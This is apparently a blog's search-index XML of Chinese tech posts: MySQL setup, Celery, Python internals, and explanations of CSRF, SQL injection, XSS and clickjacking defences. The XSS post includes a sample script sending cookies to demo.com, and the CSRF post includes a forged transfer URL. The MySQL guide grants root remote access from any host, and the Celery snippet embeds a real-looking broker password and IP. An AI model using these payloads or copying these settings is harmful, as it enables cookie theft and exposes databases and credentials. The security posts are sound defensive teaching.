<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Linux下安装mysql]]></title>
    <url>%2F2018%2F01%2F06%2Flinux%E4%B8%8B%E5%AE%89%E8%A3%85mysql%2F</url>
    <content type="text"><![CDATA[1.安装mysql​ centOS下安装(7.0以上) 123~$:wget https://dev.mysql.com/get/mysql57-community-release-el7-11.noarch.rpm~$:sudo rpm -Uvh mysql57-community-release-el7-11.noarch.rpm~$:sudo yum install mysql-community-server ​ ubuntu下安装(16.0以上) 123~$:sudo apt-get install mysql-server~$:sudo apt install mysql-client #安装过程中提示设置密码要牢记~$:sudo apt install libmysqlclient-dev ​ 检查是否安装成功 1~$:sudo netstat -tap | grep mysql 2.登录mysql​ centOS在安装时没有设置密码,所以要先配置为无密码登录 1234567891011121314151617181920212223 ~$:vi /etc/my.cnf 在最后添加 # skip password skip-grant-tables=1 保存重启mysql服务 ~$:systemctl restart mysqld登录 ~$:mysql -u root 直接回车进入修改密码 mysql&gt;&gt;use mysql; #切换数据库 mysql&gt;&gt;desc user; # 查看用户表 mysql&gt;&gt;update user set authentication_string=password('密码') where user="root"; #修改root用户密码字段authentication_string mysql&gt;&gt;flush privileges; #刷新权限 mysql&gt;&gt;quit; #退出退出后就可以用密码登录了 ~$:mysql -u root -p ~$:password: 输入刚才设置的密码回车 ​ ubuntu在安装过程中有设置密码直接密码登录即可 12~$:mysql -u root -p~$:password: 输入安装时设置的密码回车 3.设置远程登录mysql​ centOS设置 1234567891011 ~$:mysql -u root -p ~$:password: 输入密码回车 mysql&gt;&gt;use mysql; mysql&gt;&gt;grant all privileges on *.* to ‘root’@’%’ identified by ‘远程登录密码’; mysql&gt;&gt;flush privileges; mysql&gt;&gt;exit; ~$:sudo systemctl restart mysqld.service #重启服务补充几个命令: 1、开启命令: sudo systemctl start mysqld.service 2、停止命令：sudo systemctl stop mysqld.service 3、查看状态：sudo systemctl status mysqld.service ​ ubuntu设置 12345678910~$:sudo vi /etc/mysql/mysql.conf.d/mysqld.cnf 注释掉bind-address = 127.0.0.1： 保存,退出~$:mysql -u root -p~$:password: 输入密码回车mysql&gt;&gt;use mysql;mysql&gt;&gt;grant all on *.* to root@'%' identified by '远程登录密码' with grant option;mysql&gt;&gt;flush privileges;mysql&gt;&gt;exit;~$:service mysql restart #重启服务 ​ 防火墙打开3306端口 123456打开防火墙端口 ~$:firewall-cmd --zone=public --add-port=3306/tcp --permanent重载防火墙 ~$:firewall-cmd --reload查看防火墙开启端口 ~$:firewall-cmd --zone=public --list-ports ​ 完成以上设置,可以在windows下使用navicat尝试远程连接mysql了!]]></content>
      <categories>
        <category>database</category>
      </categories>
      <tags>
        <tag>Linux下安装mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python之跨模块全局变量]]></title>
    <url>%2F2017%2F01%2F06%2Fpython%E4%B9%8B%E8%B7%A8%E6%A8%A1%E5%9D%97%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%2F</url>
    <content type="text"></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSRF攻击与防御]]></title>
    <url>%2F2016%2F12%2F08%2FCSRF%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%2F</url>
    <content type="text"><![CDATA[CSRF概念：CSRF跨站点请求伪造(Cross—Site Request Forgery)，跟XSS攻击一样，存在巨大的危害性，你可以这样来理解： 攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。 如下：其中Web A为存在CSRF漏洞的网站，Web B为攻击者构建的恶意网站，User C为Web A网站的合法用户。 CSRF攻击攻击原理 用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A； 2.在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A； 用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B； 网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A； 浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。 CSRF漏洞检测 检测CSRF漏洞是一项比较繁琐的工作，最简单的方法就是抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。 随着对CSRF漏洞研究的不断深入，不断涌现出一些专门针对CSRF漏洞进行检测的工具，如CSRFTester，CSRF Request Builder等。 以CSRFTester工具为例，CSRF漏洞检测工具的测试原理如下：使用CSRFTester进行测试时，首先需要抓取我们在浏览器中访问过的所有链接以及所有的表单等信息，然后通过在CSRFTester中修改相应的表单等信息，重新提交，这相当于一次伪造客户端请求。如果修改后的测试请求成功被网站服务器接受，则说明存在CSRF漏洞，当然此款工具也可以被用来进行CSRF攻击 CSRF攻击防御（1）验证 HTTP Referer 字段 根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站，比如需要访问 http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory，用户必须先登陆 bank.example，然后通过点击页面上的按钮来触发转账事件。这时，该转帐请求的 Referer 值就会是转账按钮所在的页面的 URL，通常是以 bank.example 域名开头的地址。而如果黑客要对银行网站实施 CSRF 攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的 Referer 是指向黑客自己的网站。因此，要防御 CSRF 攻击，银行网站只需要对于每一个转账请求验证其 Referer 值，如果是以 bank.example 开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求。 这种方法的显而易见的好处就是简单易行，网站的普通开发人员不需要操心 CSRF 的漏洞，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查 Referer 的值就可以。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑，没有风险，非常便捷。然而，这种方法并非万无一失。Referer 的值是由浏览器提供的，虽然 HTTP 协议上有明确的要求，但是每个浏览器对于 Referer 的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer 值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不安全。事实上，对于某些浏览器，比如 IE6 或 FF2，目前已经有一些方法可以篡改 Referer 值。如果 bank.example 网站支持 IE6 浏览器，黑客完全可以把用户浏览器的 Referer 值设为以 bank.example 域名开头的地址，这样就可以通过验证，从而进行 CSRF 攻击。 即便是使用最新的浏览器，黑客无法篡改 Referer 值，这种方法仍然有问题。因为 Referer 值会记录下用户的访问来源，有些用户认为这样会侵犯到他们自己的隐私权，特别是有些组织担心 Referer 值会把组织内网中的某些信息泄露到外网中。因此，用户自己可以设置浏览器使其在发送请求时不再提供 Referer。当他们正常访问银行网站时，网站会因为请求没有 Referer 值而认为是 CSRF 攻击，拒绝合法用户的访问。 （2）在请求地址中添加 token 并验证 CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的 cookie 来通过安全验证。要抵御 CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。 这种方法要比检查 Referer 要安全一些，token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，但这种方法的难点在于如何把 token 以参数的形式加入请求。对于 GET 请求，token 将附在请求地址之后，这样 URL 就变成 http://url?csrftoken=tokenvalue。 而对于 POST 请求来说，要在 form 的最后加上 ，这样就把 token 以参数的形式加入请求了。但是，在一个网站中，可以接受请求的地方非常多，要对于每一个请求都加上 token 是很麻烦的，并且很容易漏掉，通常使用的方法就是在每次页面加载时，使用 javascript 遍历整个 dom 树，对于 dom 中所有的 a 和 form 标签后加入 token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的 html 代码，这种方法就没有作用，还需要程序员在编码时手动添加 token该方法还有一个缺点是难以保证 token 本身的安全。特别是在一些论坛之类支持用户自己发表内容的网站，黑客可以在上面发布自己个人网站的地址。由于系统也会在这个地址后面加上 token，黑客可以在自己的网站上得到这个 token，并马上就可以发动 CSRF 攻击。为了避免这一点，系统可以在添加 token 的时候增加一个判断，如果这个链接是链到自己本站的，就在后面添加 token，如果是通向外网则不加。不过，即使这个 csrftoken 不以参数的形式附加在请求之中，黑客的网站也同样可以通过 Referer 来得到这个 token 值以发动 CSRF 攻击。这也是一些用户喜欢手动关闭浏览器 Referer 功能的原因。 （3）在 HTTP 头中自定义属性并验证 这种方法也是使用 token 并进行验证，和上一种方法不同的是，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到 HTTP 头中自定义的属性里。通过 XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把 token 值放入其中。这样解决了上种方法在请求中加入 token 的不便，同时，通过 XMLHttpRequest 请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会透过 Referer 泄露到其他网站中去。 然而这种方法的局限性非常大。XMLHttpRequest 请求通常用于 Ajax 方法中对于页面局部的异步刷新，并非所有的请求都适合用这个类来发起，而且通过该类请求得到的页面不能被浏览器所记录下，从而进行前进，后退，刷新，收藏等操作，给用户带来不便。另外，对于没有进行 CSRF 防护的遗留系统来说，要采用这种方法来进行防护，要把所有请求都改为 XMLHttpRequest 请求，这样几乎是要重写整个网站，这代价无疑是不能接受的。 CSRF攻击实列 受害者 Bob 在银行有一笔存款，通过对银行的网站发送请求 http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=bob2 可以使 Bob 把 1000000 的存款转到 bob2 的账号下。通常情况下，该请求发送到网站后，服务器会先验证该请求是否来自一个合法的 session，并且该 session 的用户 Bob 已经成功登陆。 黑客 Mallory 自己在该银行也有账户，他知道上文中的 URL 可以把钱进行转帐操作。Mallory 可以自己发送一个请求给银行：http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory。但是这个请求来自 Mallory 而非 Bob，他不能通过安全认证，因此该请求不会起作用。 这时，Mallory 想到使用 CSRF 的攻击方式，他先自己做一个网站，在网站中放入如下代码： src=”http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory ”，并且通过广告等诱使 Bob 来访问他的网站。当 Bob 访问该网站时，上述 url 就会从 Bob 的浏览器发向银行，而这个请求会附带 Bob 浏览器中的 cookie 一起发向银行服务器。大多数情况下，该请求会失败，因为他要求 Bob 的认证信息。但是，如果 Bob 当时恰巧刚访问他的银行后不久，他的浏览器与银行网站之间的 session 尚未过期，浏览器的 cookie 之中含有 Bob 的认证信息。这时，悲剧发生了，这个 url 请求就会得到响应，钱将从 Bob 的账号转移到 Mallory 的账号，而 Bob 当时毫不知情。等以后 Bob 发现账户钱少了，即使他去银行查询日志，他也只能发现确实有一个来自于他本人的合法请求转移了资金，没有任何被攻击的痕迹。而 Mallory 则可以拿到钱后逍遥法外。 注: 本文搜集与网上,转载地址：http://www.phpddt.com/reprint/csrf.html,感谢作者,写的非常好。]]></content>
      <categories>
        <category>network security</category>
      </categories>
      <tags>
        <tag>如何防范CSRF攻击?</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[celery的简单安装及应用]]></title>
    <url>%2F2016%2F06%2F13%2FCelery%E7%9A%84%E7%AE%80%E5%8D%95%E5%AE%89%E8%A3%85%E4%B8%8E%E5%BA%94%E7%94%A8%2F</url>
    <content type="text"><![CDATA[Celery介绍Celery 是一个简单、灵活且可靠的，处理大量消息的分布式系统，并且提供维护这样一个系统的必需工具。它是一个专注于实时处理的任务队列，同时也支持任务调度。但Celery本身不提供队列服务，官方推荐使用RabbitMQ或Redis来实现消息队列服务，前者是更好的选择，它对AMQP（高级消息队列协议）做出了非常好的实现。 所以在使用Celery之前需要在远程服务器(centOS)上部署RabbitMQ,我们这里使用docker来安装,关于为什么使用docker来安装,可以查看我的另一片docker的介绍: 安装RabbitMQ 123456# 安装镜像docker pull rabbitmq# 创建容器名为myrabbit,并运行镜像docker run -d -p 5672:5672 --name myrabbit rabbitmq# 进入此容器docker container exec -it myrabbit /bin/bash 创建用户、资源以及分配操作权限 12345678# 创建用户 自定义用户名username,和密码passwordrabbitmqctl add_user username password# 设置用户为管理员用户rabbitmqctl set_user_tags username administrator# 创建消息队列rabbitmqctl add_vhost myvhost# 给用户分配权限, 读/写/配置 ".*" 表示所有权限rabbitmqctl set_permissions -p myvhost username ".*" ".*" ".*" 创建celery实例(注意这个是在你Django项目中进行的) 12345678910111213141516171819# 下面这段代码,放在你工程目录的init.py文件中project_name = 'name' #这里name填写你的项目名称project_settings = '%s.settings' % project_name# 注册环境变量os.environ.setdefault('DJANGO_SETTINGS_MODULE', project_settings)app = celery.Celery( project_name, # 下面jerry换成你自己服务器配置RabbitMQ的用户名,leijun520换成你自己的密码,ip地址换成你自己的ip地址,端口号如果默认的5672则不用更改, myvhost是你自己创建的消息队列名称 backend='amqp://jerry:leijun520@120.77.222.217:5672/myvhost', broker='amqp://jerry:leijun520@120.77.222.217:5672/myvhost')# 从默认的配置文件读取配置信息app.config_from_object('django.conf:settings')# Celery加载所有注册的应用app.autodiscover_tasks(lambda: settings.INSTALLED_APPS) 启动 celery创建worker(在本地项目中启动) 12# project_name你项目名称, -l 为日志log,info为异常等级,也可以为debug等,&amp;表示启动进程在后台运行celery -A project_name worker -l info &amp; 执行异步任务 123456@app.taskdef send_email(from, to, cc, subject, content): passasync_result = send_email.delay('', [], [], '', '')async_result.get() 创建定时任务 12345678# 导包from celery.schedules import crontabfrom celery.task import periodic_task@periodic_task(run_every=crontab('*', '12,18'))def print_dummy_info(): print('定时任务') 检查定时任务并交给worker执行 1celery -A project_name beat -l info 检查消息队列状况 12# 在配置服务器端执行检查rabbitmqctl list_queues -p myvhost 注: 推荐阅读：《Celery官方文档中文版》，上面有极为详细的配置和使用指南。]]></content>
      <categories>
        <category>python Django</category>
      </categories>
      <tags>
        <tag>celery的应用</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入攻击]]></title>
    <url>%2F2016%2F01%2F06%2FSQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[什么是SQL注入?所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。 SQL注入攻击原理SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。 SQL注入分类 平台层注入由不安全的数据库配置或数据库平台的漏洞所致 代码层注入由于程序员对输入未进行细致地过滤，从而执行了非法的数据查询。 SQL注入原因 基于分类，SQL注入的产生原因通常表现在以下几方面：①不当的类型处理；②不安全的数据库配置；③不合理的查询集处理；④不当的错误处理；⑤转义字符处理不合适；⑥多个提交处理不当。 如何防御SQL注入对于防御需要做的就是两件事：（1）找到所有的SQL注入漏洞；（2）修补这些漏洞； 1使用预编译语句一般来说，防御SQL语句注入的最佳方式，就是使用预编译语句，绑定变量。 使用预编译的SQL语句，SQL语句的语义不会发生改变，在SQL语句中，变量用？表示，攻击者无法改变SQL的结构。 2 使用存储过程除了使用预编译语句外，我们还可以使用安全的存储过程对抗SQL注入。使用存储过程的效果和使用预编译语句类似，其区别就是存储过程需要先将SQL语句定义在数据库中。但需要注意的是，存储过程中也可能会存在注入问题，因此应该尽量避免在存储过程内使用动态的SQL语句，如果无法避免，则应该使用严格的输入过滤或者是编码函数来处理用户的输入数据。 3 检查数据类型检查输入数据的数据类型，在很大程度上可以对抗SQL注入。 4 使用安全函数一般来说，各种web语言都实现了一些编码函数，可以帮助对抗SQL注入。 在最后，从数据库自身的角度来说，应该使用最小权限原则，避免web应用直接使用root、dbowner等高权限账户直接连接数据库。如果有多个不同的应用在使用同一个数据库，则也应该为每个应用分配不同的账户。Web应用使用的数据库账户，不应该创建自定义函数、操作本地文件的权限。除了SQL注入外，在web安全领域还有其他的攻击注入，这些注入攻击都有相同的特点，就是违背了“数据与代码分离”原则。]]></content>
      <categories>
        <category>network security</category>
      </categories>
      <tags>
        <tag>SQL注入攻击</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何预防XSS攻击?]]></title>
    <url>%2F2016%2F01%2F06%2F%E5%A6%82%E4%BD%95%E9%A2%84%E9%98%B2XSS%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[什么是XSS?XSS 攻击，即跨站脚本攻击（Cross Site Scripting），它是 web 程序中常见的漏洞。 XSS如何攻击?其原理是攻击者往 web 页面里插入恶意的脚本代码（CSS代码、JavaScript代码等），当用户浏览该页面时，嵌入其中的脚本代码会被执行，从而达到恶意攻击用户的目的。如盗取用户cookie，破坏页面结构、重定向到其他网站等。 举个列子: 有一个web页面,内含表单共用户发表文章(如博客网站),假如我是一个攻击者,我会在内容中添加一些攻击代码,比如盗取其他用户cookie信息: 12345This is a XSS test!&lt;script&gt;var cookie = document.cookie;window.open("http://demo.com/getCookie.php?param="+cookie)&lt;/script&gt; 如果该网页管理者没有对我提交的表单内容做任何过滤处理,当其他用户查看我的内容时,,其他用户的cookie信息就会发送至我的http://demo.com站点,被我盗取。 如何预防?要想防范攻击我们就需要对用户提交的表单内容进行过滤,有时数据库也有可能被攻击,这时就需要对模板中的输出数据也进行过滤,所以总结起来一般就这两种常见方法: 对用户输入的数据进行过滤。 对视图模板中输出的数据进行过滤。 过滤其实就是将用户提交的代码中的一些特殊字符转化为html实体,比如将上面代码中的&amp; , &lt; , &gt;等字符转换,代码就变成如下样子: 12345&amp;lt;b&amp;gt;This is a XSS test!&amp;lt;/b&amp;gt;&amp;lt;script&amp;gt;var cookie = document.cookie;window.open(&amp;quot;http://demo.com/getCookie.php?param=&amp;quot;+cookie);&amp;lt;/script&amp;gt; 这样代码基本就无法执行了,举例: python的django中一般使用escape过滤器对单一变量进行转义过滤,或者使用django的html文档自动转义。 在 PHP 中，可以使用 htmlspecialchars 或 htmlentities 函数对用户提交的表单数据进行过滤。]]></content>
      <categories>
        <category>network security</category>
      </categories>
      <tags>
        <tag>如何预防XSS攻击?</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[进程线程]]></title>
    <url>%2F2016%2F01%2F06%2F%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[进程什么是进程?打开任务管理器,看到的每一个任务就是一个进程,所以多进程,也叫多任务,下面讲讲多任务的由来: 1， 早期的计算机是没有操作系统的，只有输入，计算，输出。手工输入速度远低于计算机的计算速度。 2， 于是出现了批处理操作系统，通过纸带，磁带等工具预先写入指令，形成一个指令清单（即任务）交给计算机处理。但批处理系统的缺点是只能有一个任务，而且当计算机在进行I/O处理时，CPU是空闲的。 3， 世人发明了进程，一个进程就代表一个任务，多个进程通过分时操作能让用户认为并行操作多任务，进程间的资源是独立单元，但是可以通过介质进行通信。缺点：进程内只进行串行处理，无法很好地分工合作提高处理效率。 4， 于是就有了操作系统调度的最小单元-线程，线程能够使进程内的子任务能够共享进程内的资源，并并行工作，大大提高操作系统的性能。 区别：线程是任务调度的最小单元，共用进程内的资源。进程是资源分配的最小单元，与其他进程资源互相独立。 线程在一个进程的内部，要同时干多件事，就需要同时运行多个“子任务”，我们把进程内的这些“子任务”叫做线程。 线程通常叫做轻型的进程。线程是共享内存空间的并发执行的多任务，每一个线程都共享一个进程的资源。 线程是最小的执行单元，而进程由至少一个线程组成。如何调度进程和线程，完全由操作系统决定，程序自己不能决定什么时候执行，执行多长时间。 模块1、_thread模块 低级模块，接近底层。2、threading模块 高级模块，对_thread进行了封装 python中的多线程是假的多线程!为什么这么说，我们先明确一个概念，全局解释器锁（GIL）global interpreter lock Python代码的执行由Python虚拟机（解释器）来控制,同时只有一个线程在执行 对Python虚拟机的访问由全局解释器锁（GIL）来控制，正是这个锁能保证同时只有一个线程在运行。 在多线程环境中，Python虚拟机按照以下方式执行。 1.设置GIL。 2.切换到一个线程去执行。 3.运行。 4.把线程设置为睡眠状态。 5.解锁GIL。 6.再次重复以上步骤。 比方我有一个4核的CPU，那么这样一来，在单位时间内每个核只能跑一个线程，然后时间片轮转切换。但是Python不一样，它不管你有几个核，单位时间多个核只能跑一个线程，然后时间片轮转。执行一段时间后让出，多线程在Python中只能交替执，100核只能用到1个核例如，下面的代码4核cpu只会用一个核，大概占用25%的cpu使用率。 进程vs线程要实现多任务，通常我们会设计Master-Worker模式，Master负责分配任务，Worker负责执行任务，因此，多任务环境下，通常是一个Master，多个Worker。 如果用多进程实现Master-Worker，主进程就是Master，其他进程就是Worker。 如果用多线程实现Master-Worker，主线程就是Master，其他线程就是Worker。 多进程模式最大的优点就是稳定性高，因为一个子进程崩溃了，不会影响主进程和其他子进程。（当然主进程挂了所有进程就全挂了，但是Master进程只负责分配任务，挂掉的概率低）著名的Apache最早就是采用多进程模式。 多进程模式的缺点是创建进程的代价大，在Unix/Linux系统下，用fork调用还行，在Windows下创建进程开销巨大。另外，操作系统能同时运行的进程数也是有限的，在内存和CPU的限制下，如果有几千个进程同时运行，操作系统连调度都会成问题。 多线程模式通常比多进程快一点，但是也快不到哪去，而且，多线程模式致命的缺点就是任何一个线程挂掉都可能直接造成整个进程崩溃，因为所有线程共享进程的内存。在Windows上，如果一个线程执行的代码出了问题，你经常可以看到这样的提示：“该程序执行了非法操作，即将关闭”，其实往往是某个线程出了问题，但是操作系统会强制结束整个进程。 在Windows下，多线程的效率比多进程要高，所以微软的IIS服务器默认采用多线程模式。由于多线程存在稳定性的问题，IIS的稳定性就不如Apache。为了缓解这个问题，IIS和Apache现在又有多进程+多线程的混合模式，真是把问题越搞越复杂。 计算密集型 vs. IO密集型是否采用多任务的第二个考虑是任务的类型。我们可以把任务分为计算密集型和IO密集型。 计算密集型任务的特点是要进行大量的计算，消耗CPU资源，比如计算圆周率、对视频进行高清解码等等，全靠CPU的运算能力。这种计算密集型任务虽然也可以用多任务完成，但是任务越多，花在任务切换的时间就越多，CPU执行任务的效率就越低，所以，要最高效地利用CPU，计算密集型任务同时进行的数量应当等于CPU的核心数。 计算密集型任务由于主要消耗CPU资源，因此，代码运行效率至关重要。Python这样的脚本语言运行效率很低，完全不适合计算密集型任务。对于计算密集型任务，最好用C语言编写。 第二种任务的类型是IO密集型，涉及到网络、磁盘IO的任务都是IO密集型任务，这类任务的特点是CPU消耗很少，任务的大部分时间都在等待IO操作完成（因为IO的速度远远低于CPU和内存的速度）。对于IO密集型任务，任务越多，CPU效率越高，但也有一个限度。常见的大部分任务都是IO密集型任务，比如Web应用。 IO密集型任务执行期间，99%的时间都花在IO上，花在CPU上的时间很少，因此，用运行速度极快的C语言替换用Python这样运行速度极低的脚本语言，完全无法提升运行效率。对于IO密集型任务，最合适的语言就是开发效率最高（代码量最少）的语言，脚本语言是首选，C语言最差。 异步IO考虑到CPU和IO之间巨大的速度差异，一个任务在执行的过程中大部分时间都在等待IO操作，单进程单线程模型会导致别的任务无法并行执行，因此，我们才需要多进程模型或者多线程模型来支持多任务并发执行。 现代操作系统对IO操作已经做了巨大的改进，最大的特点就是支持异步IO。如果充分利用操作系统提供的异步IO支持，就可以用单进程单线程模型来执行多任务，这种全新的模型称为事件驱动模型，Nginx就是支持异步IO的Web服务器，它在单核CPU上采用单进程模型就可以高效地支持多任务。在多核CPU上，可以运行多个进程（数量与CPU核心数相同），充分利用多核CPU。由于系统总的进程数量十分有限，因此操作系统调度非常高效。用异步IO编程模型来实现多任务是一个主要的趋势。 对应到Python语言，单线程的异步编程模型称为协程，有了协程的支持，就可以基于事件驱动编写高效的多任务程序。 以I/O为瓶颈的程序正是协程所擅长的 !]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>进程线程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python内存管理]]></title>
    <url>%2F2015%2F10%2F06%2Fpython%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6%2F</url>
    <content type="text"><![CDATA[python的内存管理引用计数: ​ python 内部使用引用计数,来保持追踪内存中的对象,python内部记录了多少个引用,就引用计数,当对象被创建时就创建一个引用计数,当对象不再需要的时候,这个对象的引用计数为0时,他被垃圾回收. ​ 引用计数会增加: 对象被创建;被作为参数传递给函数;作为容器对象的一个元素; ​ 引用计数减少: 一个本地引用离开他的作用域;对象的别名被显示的销毁;对象的一个别名被赋值给其他对象;窗口对象本身被销毁. 垃圾回收: ​ Python不像c++和java语言一样，他们可以不用事先声明变量类型而直接对变量进行赋值，对Python语言来讲，对象的类型和内存都是在运行时确定的。 ​ 当内存中有不再使用的部分时，垃圾收集器就会把他们清理掉。他会去检查那些引用计数为0的对象，然后清除其在内存中的空间。当然除了引用计数为0的会被清除，还有一种情况也会被垃圾收集器清掉，当两个对象相互引用时，他们本身其他引用已经为0了。 垃圾回收机制还有一个循环垃圾回收器，确保释放循环引用对象。 在Python中，许多时候申请的内存都是小块的内存，这些小块内存在申请后，很快又会被释放，由于这些内存的申请号并不是为了创建对象，所以并没有对象一级的内存池机制，这就意味着Python在运行期间会大量的执行malloc和free操作，频繁的在用户和核心态之间进行切换，这将严重影响Python的执行效率，为了加速Python的执行效率，Python引入了一个内存池机制，用于管理对小块内存的申请和释放。 内存池机制: ​ Python提供了对内存的垃圾收集机制，但是他将不用的内存放到内存池而不是反回给操作系统。 Python中所有小于256个字节的对象都是用pymalloc实现的分配器，而大的对象则使用系统的malloc，另外Python对象比如整数浮点数和list都有独立的私有内存池，对象间不共享他们的内存池，也就是说你分配又释放了大量的整数，用于缓存这些整数的内存就不能再分配给浮点数。 ​]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python内存管理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[点击劫持攻击]]></title>
    <url>%2F2015%2F08%2F11%2F%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[什么是点击劫持(ClickJacking) 点击劫持(ClickJacking)是一种视觉上的欺骗手段，攻击者使用一个透明的、不可见的iframe，覆盖在一个网页上，然后诱使用户在该网页上进行操作，此时用户在不知情的情况下点击了透明的iframe页面。通过调整iframe页面的位置，可以诱使用户恰好点击在iframe页面的一些功能性按钮上; 点击劫持与CSRF攻击有异曲同工之妙，都是在用户不知道情况下进行的攻击。但是：在CSRF中，如果出现用户交互的页面，则攻击可能无法顺利完成。与之相反的是，点击劫持没有这个顾虑，他利用的就是与用户产生交互的页面。 几种常见点击劫持手段 flash点击劫持攻击者通过Flash构造出了点击劫持，在完成一系列复杂的动作之后，最终控制了用户的摄像头，原理：黑客在Flash游戏页面内嵌了一个iframe，通过游戏选项按钮诱导用户去点击按钮，从而最终实现Flash点击劫持！每次点击完成之后按钮的位置都是可变化的、移动的。 图片覆盖劫持(XSIO)点击劫持的本质就是一种视觉欺骗，通过这种思想，黑客可以完成很多劫持，例如：钓鱼网站的实现，通过图片覆盖导致链接到一些未知的网站，从而达到黑客正真的目的。原理：通过调整图片的style使得图片能够覆盖在他所指定的任意位置。 XSIO不同于XSS，它利用的是图片的style，或者能够控制CSS。如果应用没有限制style的position为absolute的话，图片就可以覆盖到页面上的任意位置，形成点击劫持。 拖拽劫持目前很多浏览器都开始支持Drag&amp;Drop的API。对于用户来说，拖拽他们的操作更加简单。浏览器拖拽的对象可以是一个连接，也可以是一段文字，还可以从一个窗口拖拽到另外一个窗口，因此拖拽不受同源策略的影响。 “拖拽劫持”的思路是诱使用户从隐藏的不可见iframe中拖拽出攻击者希望得到的数据，然后放到攻击者能够控制的另外一个页面，从而窃取数据。 触屏劫持（TapJacking）触屏，从手机OS的角度来看，触屏实际上就是一个事件，手机OS捕捉这些事件，并执行相应的动作。 一次触屏操作，可能会对应一下几个事件的发生： （1）touchstart，手指触摸屏幕时发生； （2）Touchend，手指离开屏幕时发生； （3）Touchmove，手指滑动时发生； （4）Touchcancel，系统可取消touch事件 如何预防 进制跨域iframe通常可以写一段JavaScript代码，以禁止iframe的嵌套。这种方法叫做frame busting。 X-Frame-Options因为frame busting存在被绕过的可能，所以我们需要寻找更好的解决方案。一个比较好的解决方案就是使用一个http头—X-Frame-Options 它有三个可选的值：DENY SAMEORIGIN ALLOW-FROM-origin 当值为deny时，浏览器会拒绝当前页面加载任何frame页面；若值为SAMEORIGIN ，则frame页面的地址只能为同源域名下面的页面；若值为ALLOW-FROM-origin，则可以定义允许frame加载页面地址。 除以上方式以外：Firefox的“Content Security Policy”以及Firefox的NoScript扩展也能够有效防御ClickJacking. H5中的sandbox属性在HTML 5中，专门为iframe定义了一个新的属性，叫做sandbox；使用sandbox这一个属性后，iframe 标签加载的内容将被视为一个独立的“源”，其中的脚本将被禁止执行，表单被禁止提交，插件被禁止加载，指向其他浏览器对象的连接也会被禁止。]]></content>
      <categories>
        <category>network security</category>
      </categories>
      <tags>
        <tag>点击劫持攻击</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PEP 8风格指南]]></title>
